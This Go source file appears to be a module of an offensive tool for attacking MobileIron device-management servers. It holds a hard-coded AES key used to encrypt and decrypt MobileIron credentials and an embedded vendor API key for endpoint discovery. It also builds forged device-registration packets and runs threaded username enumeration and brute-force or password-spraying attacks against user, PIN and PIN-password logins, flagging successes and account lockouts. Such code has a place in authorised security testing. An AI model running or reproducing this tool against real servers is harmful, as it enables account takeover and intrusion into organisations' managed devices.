package mobileiron

import (
	"bytes"
	"fmt"
	"regexp"
	"strconv"
	"strings"
	"time"

	"compress/zlib"
	"crypto/aes"
	"encoding/binary"
	"encoding/hex"

	"github.com/andreburgaud/crypt2go/ecb"
	"github.com/andreburgaud/crypt2go/padding"

	"dauthi/utils"
)

type mdma struct {
	opts  utils.ChargeOpts
	logr  *utils.Logger
	count int
	valid bool
	cycle
}

type cycle struct {
	buff   *chan bool
	block  *chan bool
	length int
	api    *utils.API
}

const (
	// Usage is tool usage options
	Usage = `
  MobileIron Options:
    -a                     User-Agent for request [default: MobileIron/OpenSSLWrapper (Dalvik VM)]
    -c                     MobileIron pinSetup cookie
    -P                     MobileIron Authentication TLS Port [default: 9997]

    -guid                  MobileIron GUID value
    -pin                   MobileIron Authentication PIN
  `

	// Methods are available tool methods
	Methods = `
  MobileIron Methods:
    disco                  MobileIron endpoint discovery query
    enum                   MobileIron username validation
    decrypt                Decrypt MobileIron CipherText
    prof                   Profile the MobileIron provisioning details
    auth-user              MobileIron user based authentication
    auth-pin               MobileIron PIN authentication
    auth-pinpass           MobileIron auth-pinpassword authentication
    auth-pinuser           MobileIron PIN user based authentication
	`

	ironAPI = `OTY1MzJmZWI2ZjM0NjUzZjQ2MDRkMDY3MTNkNWY3NGQ3MzJlZjlkNA==`
	ironKey = "\xdc\x70\x40\x3f\x78\xde\xc3\x04\x0e\xa5\x36\xc1\xd8\x8d\xa1\xab\xfa\xbb\x56\xda\x3d\xd1\x47\x10\xd2\x5a\x9a\x5f\xec\x6e\x24\xe0"

	pinInit = "MIPR\x00\x02\x00\x00\x00\x00{{SIZE}}{{GUID}}\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x9b\x00\x98" +
		"RSN={{UUID}}\r\ncookie={{COOKIE}}\r\nmode=0\r\nplatform_flags=0x143\r\nchecksum={{UUID}}{{UUID}}{{UUID}}{{UUID}}\r\n\x00"

	authInitOP    = "\x1c\x03\x4d\x03\x4a"
	userAuthOP    = "\x1c\x03\xad\x03\xaa"
	pinAuthOP     = "\x1c\x03\x78\x03\x75"
	pinPassAuthOP = "\x1c\x03\xd8\x03\xd5"

	aTemplate = "MIPR\x00\x02\x00\x00\x00\x00{{SIZE}}{{GUID}}\x00\x00\x00\x00\x00\x00\x00\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00{{OPCODE}}" +
		"RSN={{UUID}}\r\nmode=0\r\nplatform_flags=0x143\r\nsafety_net_enabled=true\r\n{{USER}}{{PASS}}{{PIN}}registration_operator_name=rustyIron\r\n" +
		"reg_uuid={{UUID}}\r\nCellularTechnology=GSM\r\nClient_build_date=Dec 02 2020 17:24:10\r\nClient_version=11.0.0.0.115R\r\nClient_version_code=593\r\n" +
		"afw_capable=true\r\nbrand=google\r\nclient_name=com.mobileiron\r\ncountry_code=0\r\ncurrent_mobile_number=+14469756315\r\ncurrent_operator_name=unknown\r\n" +
		"device=walleye\r\ndevice_id={{UUID}}\r\ndevice_manufacturer=Google\r\ndevice_model=Pixel 2\r\ndevice_type=GSM\r\ndisplay_size=2729X1440\r\n" +
		"home_operator=rustyIron::333333\r\nincremental=6934943\r\nip_address=172.16.34.14\r\nlocale=en-US\r\noperator=rustyIron\r\n" +
		"os_build_number=walleye-user 11 RP1A.201005.004.A1 6934943 release-keys\r\nos_version=30\r\nphone=+14469756315\r\nplatform=Android\r\nplatform_name=11\r\n" +
		"security_patch=2020-12-05\r\nsystem_version=11\r\n\x00"

	rawAuth = "MIPR\x00\x02\x00\x00\x00\x00{{SIZE}}{{GUID}}\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x78\x00\x17\x00\x14" +
		"{{USER}}:{{PASS}}\x00"

	gatewayCustomerAPI = `https://appgw.mobileiron.com/api/v1/gateway/customers/servers?api-key=%s&domain=%s`
)

func encrypt(pt, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	mode := ecb.NewECBEncrypter(block)
	padder := padding.NewPkcs7Padding(mode.BlockSize())
	pt, err = padder.Pad(pt) // padd last block of plaintext if block size less than block cipher size
	if err != nil {
		panic(err.Error())
	}
	ct := make([]byte, len(pt))
	mode.CryptBlocks(ct, pt)
	return ct
}

func decrypt(ct, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	mode := ecb.NewECBDecrypter(block)
	pt := make([]byte, len(ct))
	mode.CryptBlocks(pt, ct)
	padder := padding.NewPkcs7Padding(mode.BlockSize())
	pt, err = padder.Unpad(pt) // unpad plaintext after decryption
	if err != nil {
		panic(err.Error())
	}
	return pt
}

func inflate(buf []byte) ([]byte, error) {
	b := bytes.NewReader(buf[32:])

	r, err := zlib.NewReader(b)
	if err != nil {
		return nil, err
	}
	tbuf := new(bytes.Buffer)
	tbuf.ReadFrom(r)
	return tbuf.Bytes(), nil
}

func int2Byte(num int) []byte {
	data := new(bytes.Buffer)
	binary.Write(data, binary.BigEndian, uint32(num))
	return data.Bytes()
}

// Init mdma with default values and return obj
func Init(o utils.ChargeOpts) *mdma {
	if o.Agent == "" {
		o.Agent = "MobileIron/OpenSSLWrapper (Dalvik VM)"
	}
	if o.Port == "" {
		o.Port = "9997"
	}
	if o.RUUID {
		o.UUID = utils.RandUUID(8)
	}
	log := utils.NewLogger("mobileiron")

	return &mdma{
		opts:  o,
		logr:  log,
		valid: false,
		cycle: cycle{
			api: &utils.API{
				Debug: o.Debug,
				Log:   log,
				Proxy: o.Proxy},
		},
	}
}

// clone() copies an *mdma for process threading
func (m *mdma) clone() *mdma {
	clone := Init(m.opts) // assign target
	clone.cycle.block = m.cycle.block
	clone.cycle.buff = m.cycle.buff

	return clone
}

// Wrapper to parse JSON/XML objects
func (m *mdma) parser(data interface{}, p string) bool {
	switch p {
	case "json":
		err := m.cycle.api.Resp.ParseJSON(data)
		if err != nil {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
			return true
		}

	case "xml":
		err := m.cycle.api.Resp.ParseXML(data)
		if err != nil {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
			return true
		}
	}

	return false
}

func (m *mdma) disco() {
	m.cycle.api.Name = `gatewayCustomerAPI`
	m.cycle.api.URL = fmt.Sprintf(gatewayCustomerAPI, ironAPI, m.opts.Endpoint)
	m.cycle.api.Data = ""
	m.cycle.api.Method = `GET`
	m.cycle.api.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent": []string{m.opts.Agent}}}

	m.cycle.api.WebCall()
	if m.cycle.api.Resp.Status != 200 {
		m.logr.Failf([]interface{}{m.opts.Endpoint}, "Discovery Failed")
		return
	}

	m.validate()
}

func (m *mdma) prof() {
	data := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
	data = strings.ReplaceAll(data, "{{GUID}}", "\xff\xff\xff\xff")
	data = strings.ReplaceAll(data, "{{UUID}}", strings.ToLower(m.opts.UUID))
	data = strings.ReplaceAll(data, "{{USER}}", "")
	data = strings.ReplaceAll(data, "{{PASS}}", "")
	data = strings.ReplaceAll(data, "{{PIN}}", "")
	buff := int2Byte(len(strings.ReplaceAll(data, "{{SIZE}}", "")) + 2)
	data = strings.ReplaceAll(data, "{{SIZE}}", string(buff[2:]))

	m.cycle.api.Name = m.opts.Method
	m.cycle.api.URL = m.opts.Endpoint + ":" + m.opts.Port
	m.cycle.api.Data = ""
	m.cycle.api.Method = `tcp`
	m.cycle.api.Opts = &map[string]interface{}{
		`request`: []string{data}}
	m.cycle.api.Offset = 1024

	m.cycle.api.SocketTLSDial()
	if m.cycle.api.Resp.Body == nil {
		m.logr.Errorf([]interface{}{m.opts.Endpoint}, "Profile Failure")
		return
	}

	// Identify if buff data is zLib compressed
	if string(m.cycle.api.Resp.Body[32:34]) == "\x78\x9c" {
		buf, err := inflate(m.cycle.api.Resp.Body)
		if err != nil {
			if m.opts.Debug > 0 {
				m.logr.Errorf(nil, "Decompression Error: %v", err)
				return
			}
		} else {
			m.opts.Cookie = regexp.MustCompile(`cookie=(.*?)\n`).FindStringSubmatch(string(buf))[1]
			m.opts.UserName = regexp.MustCompile(`userId=(.*?)\n`).FindStringSubmatch(string(buf))[1]
			m.opts.GUID, _ = strconv.Atoi(regexp.MustCompile(`senderGUID=(.*?)\n`).FindStringSubmatch(string(buf))[1])
		}
	}

	m.validate()
}

func (m *mdma) auth() {
	var file []byte
	var err error

	if m.opts.File != "" {
		file, err = utils.ReadFile(m.opts.File)
		if err != nil {
			m.logr.Fatalf([]interface{}{m.opts.File}, "File Read Failure")
		}
	}

	lines := strings.Split(string(file), "\n")
	block := make(chan bool, m.opts.Threads)
	buff := make(chan bool, len(lines))
	m.cycle.block = &block
	m.cycle.buff = &buff
	m.cycle.length = len(lines)

	m.logr.Infof([]interface{}{m.opts.Method}, "threading %d values across %d threads", m.cycle.length, m.opts.Threads)

	for _, line := range lines {
		if len(lines) > 1 && line == "" {
			*m.cycle.buff <- true
			continue
		}

		target := m.clone()

		switch m.opts.Method {
		case "auth-user", "enum":
			if line != "" {
				target.opts.UserName = line
			}
			d1 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
			d1 = strings.ReplaceAll(d1, "{{GUID}}", "\xff\xff\xff\xff")
			d1 = strings.ReplaceAll(d1, "{{UUID}}", strings.ToLower(target.opts.UUID))
			d1 = strings.ReplaceAll(d1, "{{USER}}", "")
			d1 = strings.ReplaceAll(d1, "{{PASS}}", "")
			d1 = strings.ReplaceAll(d1, "{{PIN}}", "")
			b1 := int2Byte(len(strings.ReplaceAll(d1, "{{SIZE}}", "")) + 2)

			d2 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", userAuthOP)
			d2 = strings.ReplaceAll(d2, "{{GUID}}", "\xff\xff\xff\xff")
			d2 = strings.ReplaceAll(d2, "{{UUID}}", strings.ToLower(target.opts.UUID))
			d2 = strings.ReplaceAll(d2, "{{USER}}", "auth_username="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.opts.UserName), []byte(ironKey))))+"\r\n")
			d2 = strings.ReplaceAll(d2, "{{PASS}}", "auth_password="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.opts.Password), []byte(ironKey))))+"\r\n")
			d2 = strings.ReplaceAll(d2, "{{PIN}}", "")
			b2 := int2Byte(len(strings.ReplaceAll(d2, "{{SIZE}}", "")) + 2)

			target.cycle.api.Name = m.opts.Method
			target.cycle.api.URL = target.opts.Endpoint + ":" + target.opts.Port
			target.cycle.api.Data = ""
			target.cycle.api.Method = `tcp`
			target.cycle.api.Opts = &map[string]interface{}{
				`request`: []string{
					strings.ReplaceAll(d1, "{{SIZE}}", string(b1[2:])),
					strings.ReplaceAll(d2, "{{SIZE}}", string(b2[2:]))}}
			target.cycle.api.Offset = 167

			if m.opts.Method == "enum" {
				for target.count = 0; target.count < 6; target.count++ {
					target.thread()
				}
				continue
			}

		case "auth-pin":
			if line != "" {
				target.opts.PIN = line
			}
			d1 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
			d1 = strings.ReplaceAll(d1, "{{GUID}}", "\xff\xff\xff\xff")
			d1 = strings.ReplaceAll(d1, "{{UUID}}", strings.ToLower(target.opts.UUID))
			d1 = strings.ReplaceAll(d1, "{{USER}}", "")
			d1 = strings.ReplaceAll(d1, "{{PASS}}", "")
			d1 = strings.ReplaceAll(d1, "{{PIN}}", "")
			b1 := int2Byte(len(strings.ReplaceAll(d1, "{{SIZE}}", "")) + 2)

			d2 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", pinAuthOP)
			d2 = strings.ReplaceAll(d2, "{{GUID}}", "\xff\xff\xff\xff")
			d2 = strings.ReplaceAll(d2, "{{UUID}}", strings.ToLower(target.opts.UUID))
			d2 = strings.ReplaceAll(d2, "{{USER}}", "")
			d2 = strings.ReplaceAll(d2, "{{PASS}}", "")
			d2 = strings.ReplaceAll(d2, "{{PIN}}", "auth_pin="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.opts.PIN), []byte(ironKey))))+"\r\n")
			b2 := int2Byte(len(strings.ReplaceAll(d2, "{{SIZE}}", "")) + 2)

			target.cycle.api.Name = target.opts.Method
			target.cycle.api.URL = target.opts.Endpoint + ":" + target.opts.Port
			target.cycle.api.Data = ""
			target.cycle.api.Method = `tcp`
			target.cycle.api.Opts = &map[string]interface{}{
				`request`: []string{
					strings.ReplaceAll(d1, "{{SIZE}}", string(b1[2:])),
					strings.ReplaceAll(d2, "{{SIZE}}", string(b2[2:]))}}
			target.cycle.api.Offset = 167

		case "auth-pinpass":
			if line != "" {
				target.opts.PIN = line
			}
			d1 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
			d1 = strings.ReplaceAll(d1, "{{GUID}}", "\xff\xff\xff\xff")
			d1 = strings.ReplaceAll(d1, "{{UUID}}", strings.ToLower(target.opts.UUID))
			d1 = strings.ReplaceAll(d1, "{{USER}}", "")
			d1 = strings.ReplaceAll(d1, "{{PASS}}", "")
			d1 = strings.ReplaceAll(d1, "{{PIN}}", "")
			b1 := int2Byte(len(strings.ReplaceAll(d1, "{{SIZE}}", "")) + 2)

			d2 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", pinPassAuthOP)
			d2 = strings.ReplaceAll(d2, "{{GUID}}", "\xff\xff\xff\xff")
			d2 = strings.ReplaceAll(d2, "{{UUID}}", strings.ToLower(target.opts.UUID))
			d2 = strings.ReplaceAll(d2, "{{USER}}", "auth_username="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.opts.UserName), []byte(ironKey))))+"\r\n")
			d2 = strings.ReplaceAll(d2, "{{PASS}}", "auth_password="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.opts.Password), []byte(ironKey))))+"\r\n")
			d2 = strings.ReplaceAll(d2, "{{PIN}}", "auth_pin="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.opts.PIN), []byte(ironKey))))+"\r\n")
			b2 := int2Byte(len(strings.ReplaceAll(d2, "{{SIZE}}", "")) + 2)

			target.cycle.api.Name = m.opts.Method
			target.cycle.api.URL = m.opts.Endpoint + ":" + m.opts.Port
			target.cycle.api.Data = ""
			target.cycle.api.Method = `tcp`
			target.cycle.api.Opts = &map[string]interface{}{
				`request`: []string{
					strings.ReplaceAll(d1, "{{SIZE}}", string(b1[2:])),
					strings.ReplaceAll(d2, "{{SIZE}}", string(b2[2:]))}}
			target.cycle.api.Offset = 167

		case "auth-pinuser":
			if line != "" {
				target.opts.UserName = line
			}
			d1 := strings.ReplaceAll(pinInit, "{{UUID}}", strings.ToLower(target.opts.UUID))
			d1 = strings.ReplaceAll(d1, "{{GUID}}", string(int2Byte(target.opts.GUID)))
			d1 = strings.ReplaceAll(d1, "{{COOKIE}}", target.opts.Cookie)
			b1 := int2Byte(len(strings.ReplaceAll(d1, "{{SIZE}}", "")) + 2)

			d2 := strings.ReplaceAll(rawAuth, "{{GUID}}", string(int2Byte(target.opts.GUID)))
			d2 = strings.ReplaceAll(d2, "{{USER}}", target.opts.UserName)
			d2 = strings.ReplaceAll(d2, "{{PASS}}", target.opts.Password)
			b2 := int2Byte(len(strings.ReplaceAll(d2, "{{SIZE}}", "")) + 2)

			target.cycle.api.Name = target.opts.Method
			target.cycle.api.URL = target.opts.Endpoint + ":" + target.opts.Port
			target.cycle.api.Data = ""
			target.cycle.api.Method = `tcp`
			target.cycle.api.Opts = &map[string]interface{}{
				`request`: []string{
					strings.ReplaceAll(d1, "{{SIZE}}", string(b1[2:])),
					strings.ReplaceAll(d2, "{{SIZE}}", string(b2[2:]))}}
			target.cycle.api.Offset = 167

		}

		target.thread()
	}

	for i := 0; i < m.cycle.length; i++ {
		<-*m.cycle.buff
	}
	close(*m.cycle.block)
	close(*m.cycle.buff)
}

// thread represents the threading process to loop multiple requests
func (m *mdma) thread() {
	*m.cycle.block <- true
	go func() {
		if m.valid {
			<-*m.cycle.block
			return
		}

		m.api.SocketTLSDial()
		if m.api.Resp.Status != 200 {
			if m.opts.Miss < m.opts.Retry {
				m.opts.Miss++
				m.logr.Infof([]interface{}{m.opts.Tenant, m.opts.Endpoint, m.opts.UserName, m.opts.Password}, "Retrying Request")
				<-*m.cycle.block
				m.thread()
				return
			}
			m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password, m.opts.PIN, m.opts.GUID, m.opts.Cookie}, "Null Server Response")
		}
		m.validate()

		// Sleep interval through thread loop
		time.Sleep(time.Duration(m.opts.Sleep) * time.Second)
		<-*m.cycle.block
		*m.cycle.buff <- true
	}()
}

// result takes a byte array and validates the MobileIron response
func (m *mdma) validate() {
	switch m.opts.Method {
	case "disco":
		var check struct {
			Result struct {
				HostName string `json:"hostName"`
				Domain   string `json:"domain"`
			} `json:"result"`
		}
		if m.parser(&check, "json") {
			return
		}

		if check.Result.Domain != "" {
			m.logr.Successf([]interface{}{check.Result.HostName}, "Endpoint Discovery")
			return
		}
		m.logr.Failf([]interface{}{m.opts.Endpoint}, "Discovery Failed")

	case "prof", "auth-user", "enum", "auth-pin", "auth-pinpass", "auth-pinuser":
		type action struct {
			name string
			pre  []interface{}
			post []interface{}
		}
		if strings.Contains(string(m.cycle.api.Resp.Body[32:35]), "\x00\x1d\x01") {
			if m.opts.Debug > 0 {
				m.logr.Infof([]interface{}{m.opts.Method}, "Initialization Successful")
			}
		} else if strings.Contains(string(m.cycle.api.Resp.Body[:2]), "\x00\x00") {
			m.logr.Failf([]interface{}{m.opts.Endpoint}, "Null Response")
		}

		msg := map[string]action{
			"\x00\x1d\x01\x1b\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.opts.Endpoint}, []interface{}{"User Authentication Endabled"}},
			"\x00\x1d\x01\x16\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.opts.Endpoint}, []interface{}{"PIN Authentication Enabled"}},
			"\x00\x1d\x01\x2f\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.opts.Endpoint}, []interface{}{"PIN-Password Authentication Enabled"}},
			"\x00\x1d\x01\x2d\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.opts.Endpoint}, []interface{}{"PIN-Password Authentication Enabled"}},
			"\x00\x1d\x01\x1a\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.opts.Endpoint}, []interface{}{"User Authentication + Mutual Certificate Enabled"}},
			"\x00\x1d\x01\x2e\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.opts.Endpoint}, []interface{}{"PIN Authentication + Mutual Certificate Authentication Enabled"}},
			"\x00\x1d\x01\x15\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.opts.Endpoint}, []interface{}{"PIN-Password + Mutual Certificate Authentication Enabled"}},
			"\x00\x1d\x00\x32\x00\x00\x01\x93":     action{"fail", []interface{}{m.opts.UserName, m.opts.Password, m.opts.PIN}, []interface{}{"Authentication Failure: %s", m.cycle.api.Resp.Body[42:167]}},
			"\x00\x1d\x00\x64\x00\x00\x01\x93":     action{"success", []interface{}{m.opts.UserName, m.opts.Password}, []interface{}{"Authentication Successful"}},
			"\x78\x9c\xbd":                         action{"success", []interface{}{m.opts.UserName, m.opts.Password}, []interface{}{"Authentication Successful - Configuration Received"}},
			"\x00\x1d\x00\x4c\x00\x00\x01\x93":     action{"info", []interface{}{m.opts.UserName, m.opts.Password}, []interface{}{"Account Lockout: %s", m.cycle.api.Resp.Body[42:167]}},
			"\x00\x1d\x00\x4b\x00\x00\x01\x93":     action{"info", []interface{}{m.opts.UserName, m.opts.Password}, []interface{}{"Account Lockout: %s", m.cycle.api.Resp.Body[42:167]}},
			"\x00\x1d\x00\x84\x00":                 action{"fail", []interface{}{m.opts.Endpoint}, []interface{}{"Device Unregistered: %s", m.cycle.api.Resp.Body[42:167]}},
			"\x00\x00\x00\x53\x00":                 action{"fail", []interface{}{m.opts.Endpoint}, []interface{}{"Unknown Client ID: %s", m.cycle.api.Resp.Body[38:167]}},
			"\x00\x1d\x00\x1b\x00\x00\x01\x90\x00": action{"fail", []interface{}{m.opts.Endpoint}, []interface{}{"Submission Failure: %s", m.cycle.api.Resp.Body[42:167]}},
		}

		check := string(m.cycle.api.Resp.Body[32:41])
		for key, val := range msg {
			fmt.Printf("%v\n", val)
			if strings.Contains(check, key) {
				switch val.name {
				case "info":
					m.logr.Infof(val.pre, val.post[0].(string), val.post[1:]...)
					return

				case "fail":
					m.logr.Failf(val.pre, val.post[0].(string), val.post[1:]...)
					return

				case "success":
					m.logr.Successf(val.pre, val.post[0].(string), val.post[1:]...)
					return
				}
			}
		}
		m.logr.Infof([]interface{}{m.opts.Endpoint, fmt.Sprintf("%x", m.cycle.api.Resp.Body[32:41])}, "Unknown Response: %x")

	}
}

// Call represents the switch function for activating all class methods
func (m *mdma) Call() {
	switch m.opts.Method {
	case "disco":
		if m.opts.Endpoint == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Domain required")
			return
		}
		m.disco()

	case "prof":
		if m.opts.Endpoint == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Endpoint required")
			return
		}
		m.prof()

	case "decrypt":
		if m.opts.Endpoint == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "CipherTXT required")
			return
		}
		b, _ := hex.DecodeString(m.opts.Endpoint)
		m.logr.Successf(nil, "Decrypted Cipher: %s - %q", m.opts.Endpoint, decrypt(b, []byte(ironKey)))

	case "auth-user", "enum", "auth-pin", "auth-pinpass", "auth-pinuser":
		m.auth()

	default:
		m.logr.StdOut(Methods)
		m.logr.Fatalf(nil, "Invalid Method Selected %v", m.opts.Method)
	}
}
